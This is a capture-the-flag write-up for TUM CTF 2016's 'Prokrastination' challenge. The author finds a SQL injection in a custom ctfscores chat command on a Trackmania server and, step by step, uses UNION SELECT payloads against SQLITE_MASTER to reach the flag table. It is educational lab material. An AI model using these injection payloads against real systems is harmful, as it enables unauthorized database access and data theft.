# TUM CTF 2016 - Prokrastination

```
So you like hacking? We like wasting time. I hope you do too.
tmtp://#join=H4x0rPsch0rr
HINT: https://www.youtube.com/watch?v=4M-hEJtBZ9Y
```

  As a veteran Trackmania (Nations Forever) player, I was pleased to see the "tmtp" protocol in a challenge description, which made me curious about what this challenge was about.  

  The first (optional) step was obviously to install Trackmania Nations Forever (later referred to as TMNF) via [this link](http://files.trackmaniaforever.com/tmnationsforever_setup.exe).  
  The server can now be joined (and you need to choose between searching for the flag or beating local records).

  TMNF servers featuring time-attack mode make the players compete against one another on a specific track during a time-frame depending on the track. Players can restart as many time as they want in order to get the top time, and, on registered servers, top players are awarded Ladder Points.  
  However interesting this idea was, it soon became obvious that the flag would not be given to the server's best player.

  TMNF servers are highly customizable, and server admins often use this to pimp the interface in order to display local records, world records, etc.  
  Customization is made possible through the use of PHP plugins managed through the XASECO plugin manager. Plugins may be queried by users/admins using the server chat (enabled by pressing [space]), and a full list is given when typing **/help**:
  
  ![help](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/help.png)
  
  CTF players will most likely notice the *ctfscores* command available, which is not a standard TMNF plugin. The corresponding plugin name can be obtained by typing **/plugins**:
  
  ![plugins](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/plugins.png)
  
  Google searches for "chat.ctfstats.php" return no significant result as the plugin has most likely been developed a couple days before. Using the command **/ctfscores** displays a scoreboard of imaginary ctf teams. In order to assess the attack surface, one has to use the **/helpall** command, which will give a more detailled explanation of the commands:
  
  ![helpall](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/helpall.png)
  
  So **/ctfscore** takes an argument, which support wildcards and jokers. Being a search function this most likely relies on an underlying database centralizing the teams and their scores, and maybe a flag. This became a possible solution when my first random try kind of worked:
  
  ```/ctfscores TEST' OR 1=1--```

  ![or11](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/or1%3D1.png)
  
  At this point though, there could still be input validation that ruled out my payload and showed all the teams, but the next payload indicated with 100% certainty that the exploit would be SQL Injections:
  
  ```/ctfscores TEST' AND 1=0--```

  ![and10](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/AND1%3D0.png)
  
  Next goal consisted in determining whether direct SQL injections were possible, or if we had to use blind SQL injections, which would be a pain in the *ss using the TMNF chat. Guessing from the scoreboard results, a correct **UNION** statement would be the following:
  
  ```/ctfscores TEST' UNION SELECT 1,'team',3--```

  ![union1](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/union_1.png)
  
  The flag was not located in the scoreboard table, so I had to determine which database backend was used in order to find the schema table (information_schema.schema, SQLITE_MASTER, etc.). 
  I decided to test multiple concatenation methods to discriminate between backends, mainly between MySQL and SQLITE. The following one would only work for SQLITE (and Oracle, IBM DB2, which are unlikely backends):
  
  ```/ctfscores TEST' UNION SELECT 1, 'a'||'b', 3--```

  ![union2](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/union_2.png)
  
  In SQLITE, tables are described in the SQLITE_MASTER tables, whichs stores at least the table name and the original *CREATE TABLE* statement. This is done in two requests because the results cannot be read easily on the scoreboard :D
  
  ```/ctfscores TEST' UNION SELECT 1, tbl_name, 3 FROM SQLITE_MASTER--```

  ![union3](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/union_3.png)
  
  Next, I dumped the *CREATE TABLE* statement to get the columns' names:
  
  ```/ctfscores TEST' UNION SELECT 1, sql, 3 FROM SQLITE_MASTER WHERE tbl_name='flag'```

  ![union4](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/union_4.png)
  
  And finally, attack the flag!
  
  ```/ctfscores TEST' UNION SELECT 1, flag_content, 3 FROM flag--```

  ![union5](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2016/TUMCTF/Misc-Prokrastination/resources/union_5.png)
  
  
Thanks for the organizing team, and in particular to Delirium who create this challenge!
BRNN tata BRNN TAT !
